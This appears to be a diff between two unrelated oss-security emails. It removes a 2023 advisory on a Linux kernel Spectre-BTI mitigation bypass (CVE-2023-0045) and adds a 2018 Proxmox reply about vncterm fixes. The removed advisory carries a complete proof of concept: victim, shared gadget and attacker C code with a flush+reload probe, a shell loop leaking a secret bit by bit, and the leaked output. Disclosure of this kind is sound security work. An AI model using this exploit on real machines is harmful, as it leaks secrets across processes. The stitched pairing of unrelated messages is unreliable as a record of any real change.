@@ -1,4 +1,9 @@
-Received: (qmail 20227 invoked by uid 550); 3 Feb 2023 18:18:33 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["696" "Friday" "23" "February" "2018" "09:20:48" "+0100" "Dominik Csapak" "d.csapak@proxmox.com" "<b25d53ba-7344-a2c2-fb22-b7744ee1016e@proxmox.com>" "22" "Re: [oss-security] review of LibVNCServer/vncterm proxmox/vncterm proxmox/spiceterm xenserver/vncterm qemu/ui/console.c" nil nil nil "2" "2018022308:20:48" "[oss-security] review of LibVNCServer/vncterm proxmox/vncterm proxmox/spiceterm xenserver/vncterm qemu/ui/console.c" (number mark "U       d.csapak@pro Feb 23   22/696   " thread-indent "\"Re: [oss-security] review of LibVNCServer/vncterm proxmox/vncterm proxmox/spiceterm xenserver/vncterm qemu/ui/console.c\"\n") "<20180222182926.GA4275@openwall.com>" ("<20180222182926.GA4275@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 4052 invoked by uid 550); 23 Feb 2018 11:21:10 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,349 +12,41 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 15547 invoked from network); 3 Feb 2023 18:11:25 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=chromium.org; s=google;
-        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
-         :date:message-id:reply-to;
-        bh=6W0io5dCKTOT0PFtnqv07eiu4G+f+ddslxfjfop2gVQ=;
-        b=V8RbMgnBsuDPR5iEHShBib6FzgOX8AVO8eME4+z/UYFyUfyU02mRwuTwGkNyZR213Q
-         wHwGjgxeulOF9K41YeRjusjiyXZu8/Dps7ToGumCPRppaTElSah66NMo6IBrlVvb5IUJ
-         7bOT6qphlOSGiXMZj38RM9809NJzW7r5J1IOM=
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
-         :from:to:cc:subject:date:message-id:reply-to;
-        bh=6W0io5dCKTOT0PFtnqv07eiu4G+f+ddslxfjfop2gVQ=;
-        b=oX0B1VSIkbOPRm3wTezWo3+Di2SfBMr/kH/jgwLCB/6BEdtrurPX8zVXiO4Ku4M2nV
-         bjK9T6X/rvFJvNG/eDZxiwow2bLeEsLNUs0cWY4e11jr4hsfG3GfzyIfDpwLzgfDwp7E
-         5Sqxb6R05LqVXeq96BzIgNbpNgrplTnIW/ZndkJTsZDKAHiHwq55Fbi6pbkfyh693GyX
-         G6vPe51/RzRgseuZHx3yNjZo4JTRBAFqQcc8gbX1rwIV1+j6twRCNpN++8ZCEvg9fI/6
-         9/cE/8dDJgrpVzqkRgNjcOANULgwk/AgRUO2GuKbWhnIKamVqA8ZkriXIeSgOybQx7h0
-         bMgg==
-X-Gm-Message-State: AO0yUKVL519gYRW1p+ALF8npI/MOd3ToM6D3bqRAV8pkRX0XqDLHFxyA
-	FCWHtP834eIVGahIO8TXsv+kLUIAAmCVACrxXPEvs/ULMie+LUOV
-X-Google-Smtp-Source: AK7set836X7lEnIZUzqyncm/vrCmI5e84HKBJxBnK6LcHoJBAfLFI+my11HJi9W2rSUhO6hJRFMvOQT6DJ6Y9RvWClc=
-X-Received: by 2002:a17:90a:31cb:b0:22b:b76b:5042 with SMTP id
- j11-20020a17090a31cb00b0022bb76b5042mr1476793pjf.65.1675447872590; Fri, 03
- Feb 2023 10:11:12 -0800 (PST)
-MIME-Version: 1.0
-From: Rafael Correa De Ysasi <rcorreadeysasi@chromium.org>
-Date: Fri, 3 Feb 2023 13:11:01 -0500
-Message-ID: <CAFXgH+NM7C5r0sVf52ZvO+=vP5sC6=BPBO2paJQN19H5KZcB_Q@mail.gmail.com>
+Received: (qmail 3620 invoked from network); 23 Feb 2018 08:21:04 -0000
 To: oss-security@lists.openwall.com
-Cc: 3pvd@google.com
-Content-Type: multipart/alternative; boundary="000000000000492ad905f3cf9b4a"
-Subject: [oss-security] CVE-2023-0045: Linux Kernel: Bypassing Spectre-BTI User Space Mitigations
+References: <20180222182926.GA4275@openwall.com>
+From: Dominik Csapak <d.csapak@proxmox.com>
+Message-ID: <b25d53ba-7344-a2c2-fb22-b7744ee1016e@proxmox.com>
+Date: Fri, 23 Feb 2018 09:20:48 +0100
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+ Thunderbird/52.6.0
+MIME-Version: 1.0
+In-Reply-To: <20180222182926.GA4275@openwall.com>
+Content-Type: text/plain; charset=utf-8; format=flowed
+Content-Language: en-US
+Content-Transfer-Encoding: 7bit
+Subject: Re: [oss-security] review of LibVNCServer/vncterm proxmox/vncterm
+ proxmox/spiceterm xenserver/vncterm qemu/ui/console.c
 
---000000000000492ad905f3cf9b4a
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Hi,
 
-Summary
+Thanks for the review.
 
-The Linux kernel does not correctly mitigate SMT attacks, as discovered
-through a strange pattern in the kernel API using STIBP as a mitigation[1
-<https://docs.kernel.org/userspace-api/spec_ctrl.html>], leaving the
-process exposed for a short period of time after a syscall. The kernel also
-does not issue an IBPB immediately during the syscall.
-The ib_prctl_set [2
-<https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/cpu/bugs.=
-c#L1467>]function
-updates the Thread Information Flags (TIFs) for the task and updates the
-SPEC_CTRL MSR on the function __speculation_ctrl_update [3
-<https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/process.c=
-#L557>],
-but the IBPB is only issued on the next schedule, when the TIF bits are
-checked. This leaves the victim vulnerable to values already injected on
-the BTB, prior to the prctl syscall.
-The behavior is only corrected after a reschedule of the task happens.
-Furthermore, the kernel entrance (due to the syscall itself), does not
-issue an IBPB in the default scenarios (i.e., when the kernel protects
-itself via retpoline or eIBRS).
-Severity
+I do not know where you looked at our code, but in our official git 
+repositories for vncterm[1] and spiceterm[2]
 
-High - The inability to correctly mitigate SMT attacks, leaves the kernel
-exposed for an attacker to inject malicious code into the running kernel,
-which could lead to a complete compromise of the system.
-Proof of Concept
+those issues are already fixed (since 2017-05-05)
 
-To ensure this wasn't a measurement error, we created a simple POC. The
-victim code always executes asafe_function through a function pointer that
-is vulnerable to a spectre-BTI attack. The victim requests the kernel for
-protection using the prctl syscall (inside protect_me). The victim also
-loads a secret from a text file, showing that other syscalls don=E2=80=99t =
-check
-the TIF bit or provoke a reschedule that would force an IBPB.
+i changed those variables all to unsigned int, which makes those 
+increments defined behavior, and the range checks are ok, because
+they cannot be negative anymore.
+(it may behave strange, but you cannot trigger an out-of-bounds 
+read/write anymore)
+also, i replaced the vt->cy += buf code paths with calls to
+vncterm_gotoxy (which as you mentioned, perform all necessary checks)
 
-//gcc -o victim victim.c -O0 -masm=3Dintel -no-pie -fno-stack-protector
-#include "common.h"
+Dominik
 
-int main(int argc, char *argv[])
-{
+[1]: https://git.proxmox.com/?p=vncterm.git;a=summary
+[2]: https://git.proxmox.com/?p=spiceterm.git;a=summary
 
-    setvbuf(stdout, NULL, _IONBF, 0);
-    printf("running victim %s\n", argv[1]);
-
-    //only call safe_function
-    codePtr =3D safe_function;
-    char secret[20];
-    char *sharedmem =3D open_shared_mem();
-    unsigned idx =3D string_to_unsigned(argv[1]);
-
-    //call for prctl to protect this process
-    protect_me();
-
-    //only then load the secret into memory
-    load_secret(secret);
-
-    for (int i =3D 0; i < 100; i++)
-    {
-        flush((char *)&codePtr);
-        //this arguments are never used on safe_function, but they
-match the signature of spectre_gadget, that should never be called
-        //Since prctl is called, it shouldn't be possible for an
-attacker to poison the BTB and leak the secret
-        spec(&sharedmem[2000], secret, idx);
-    }
-}
-
-Most of the libc functions were placed inside a common header between the
-attacker and the victim, so the spectre_gadget and spec functions share the
-same memory addresses on both victim and attacker (otherwise a .GOT entry
-is created and the addresses are changed). This is not a requirement and
-there are other ways to place the branches on the same addresses and mimic
-the victim context, but this method is the simplest.
-
-#include <stdlib.h>
-#include <sys/mman.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <stdio.h>
-#include <sys/prctl.h>
-
-char unused[0x1000];
-void (*codePtr)(char *, char *, unsigned idx);
-char unused2[0x1000];
-
-// this function does nothing. Always called by the victim
-void safe_function(char *a, char *b, unsigned idx)
-{
-}
-
-// this function is never called by the victim
-void spectre_gadget(char *addr, char *secret, unsigned idx)
-{
-    volatile char d;
-    if ((secret[idx / 8] >> (idx % 8)) & 1)
-        d =3D *addr;
-}
-
-// helper for better results probably not necessary but makes the tests eas=
-ier
-void flush(char *adrs)
-{
-    asm volatile(
-        "clflush [%0]                   \n"
-        :
-        : "c"(adrs)
-        :);
-}
-
-// This function is vulnerable to a spectre-BTI attack.
-void spec(char *addr, char *secret, unsigned idx)
-{
-
-    for (register int i =3D 0; i < 30; i++)
-        ;
-    codePtr(addr, secret, idx);
-}
-
-// opens file as read only in memory to be used as side channel, but
-could be any other COW file like libc for example
-char *open_shared_mem()
-{
-    int fd =3D open("sharedmem", O_RDONLY);
-    char *res =3D (char *)mmap(NULL, 0x1000, PROT_READ, MAP_PRIVATE, fd, 0);
-    // ensure page is on memory
-    volatile char d =3D res[2100];
-    return res;
-}
-
-// load secret from file
-void load_secret(char *secret)
-{
-    FILE *fp =3D fopen("secret.txt", "r");
-    fgets(secret, 20, (FILE *)fp);
-}
-
-// Calls prctl to protect the user against spectre-BTI attacks -
-https://docs.kernel.org/userspace-api/spec_ctrl.html
-void protect_me()
-{
-    usleep(1000); //not needed but resets the available time on scheduler
-    prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH,
-PR_SPEC_FORCE_DISABLE, 0, 0);
-}
-
-// Utility. All utility functions are placed on common so the spec
-function matches the same address on both victim and attacker. This is
-not necessary but makes the tests easier
-unsigned string_to_unsigned(char *s)
-{
-    return atoi(s);
-}
-
-
-The attack consists in poisoning the BTB by calling the spec function and
-making it branch to spectre_gadget instead of safe_function. After the
-training the victim process is created and it executes spec that
-mispredicts to spectre_gadget which should never be executed. The secret is
-leaked through a classic flush+reload side channel.
-
-//gcc -o attacker attacker.c -O0 -masm=3Dintel -no-pie -fno-stack-protector
-#include "common.h"
-
-#define PRINTNUM 1000
-
-unsigned probe(char *adrs)
-{
-    volatile unsigned long time;
-    asm __volatile__(
-        "    mfence             \n"
-        "    lfence             \n"
-        "    rdtsc              \n"
-        "    lfence             \n"
-        "    mov esi, eax       \n"
-        "    mov eax,[%1]       \n"
-        "    lfence             \n"
-        "    rdtsc              \n"
-        "    sub eax, esi       \n"
-        "    clflush [%1]       \n"
-        "    mfence             \n"
-        "    lfence             \n"
-        : "=3Da"(time)
-        : "c"(adrs)
-        : "%esi", "%edx");
-    return time;
-}
-
-int main(int argc, char *argv[])
-{
-
-    //Make spec function confuse safe_function with spectre_gadget
-    codePtr =3D spectre_gadget;
-
-    char dummy;
-    int hits =3D 0;
-    int tries =3D 0;
-    char *sharedmem =3D open_shared_mem();
-    setvbuf(stdout, NULL, _IONBF, 0);
-
-    while (1)
-    {
-        //Inject the target in the BTB
-        spec(&dummy, &dummy, 0);
-
-        //Allow for victim to execute and misspredict to spectre_gadget
-        usleep(1);
-
-        //probe the 1-bit flush+reload side channel
-        if (probe((char *)&sharedmem[2000]) < 0x90)
-        {
-            printf("+");
-        }
-    }
-}
-
-Since the victim receives an argument that can be used to choose the bit to
-be leaked through the side channel, we can execute the victim process
-multiple times while the attacker is executing:
-
-taskset -c 0 ./attacker >> result.txt &
-
-for i in {0..144}
-do
-    echo "Leaking bit $i... "
-    echo -e -n "Leaking bit $i: " >> result.txt
-    sleep .01
-    for j in {0..10}
-    do
-        taskset -c 0 ./victim $i >/dev/null
-    done
-
-    echo "" >> result.txt
-done
-
-python3 parseResult.py
-
-make clean
-echo -e "killing attacker"
-kill -9 $(pidof attacker)
-
-This leaves the following text file:
-
-Leaking bit 0: +++++++++++
-Leaking bit 1:
-Leaking bit 2:
-Leaking bit 3:
-Leaking bit 4:
-Leaking bit 5:
-Leaking bit 6: ++++++++++
-Leaking bit 7:
-Leaking bit 8: ++++++++
-[...]
-
-Note that bit 0 and 6 are 1, therefore the first character must be 0x41(A).
-Parsing the file with a simple Python script shows:The secret leaked is:
-b'Asuper_secret_flag' which is the exact content present in secret.txt used
-by the victim.
-Changing the prctl call for seccomp to
-syscall(SYS_seccomp,SECCOMP_SET_MODE_STRICT,0,0); after loading the secret
-doesn't prevent the attack. This is expected since internally both use the
-same ib_prctl_set function to implement the mitigation.
-Further Analysis
-
-The current implementation of the prctl syscall for speculative control
-fails to protect the user against attackers executing before the
-mitigation. The seccomp mitigation also fails in this scenario.
-The patch that added support for the conditional mitigation via prctl
-(ib_prctl_set) dates back to the kernel 4.9.176. It appears to have been
-introduced on Nov 28, 2018 in the following commit: torvalds/linux@9137bb2
-<https://github.com/torvalds/linux/commit/9137bb27e60e554dab694eafa4cca241f=
-a3a694f>
-and
-the current __speculation_ctrl_update code that sets the MSRs, but without
-the immediate IBPB, was added on the same day in the following commit:
-torvalds/linux@01daf56
-<https://github.com/torvalds/linux/commit/01daf56875ee0cd50ed496a09b20eb369=
-b45dfa5>.
-This indicates that the issue has been present in the kernel for about 4
-years.
-Mitigations
-
-For user-mode applications, a usleep after the prctl call is enough to
-force a reschedule and ensure the correct mitigation. One possible kernel
-patch for this attack is to issue the IBPB just after the STIBP is set, on
-__speculation_ctrl_update [3
-<https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/process.c=
-#L557>]
-or to call schedule(). After discussing with the Linux Kernel Security
-Team, that is what was decided, and the following commit has the fix:
-https://git.kernel.org/pub/scm/linux/kernel/git/tip/tip.git/commit/?id=3Da6=
-64ec9158eeddd75121d39c9a0758016097fa96
-=2E
-Patch
-
-This was addressed in the following [commit].(
-https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/arc=
-h/x86/kernel/cpu/bugs.c?h=3Dv6.1.9&id=3De8377f0456fb6738a4668d4df16c13d7599=
-925fd
-)
-Timeline
-
-*Date reported*: 12/30/2022
-*Date fixed*: 01/04/2023
-*Date disclosed*: 02/03/2023
-
---000000000000492ad905f3cf9b4a--
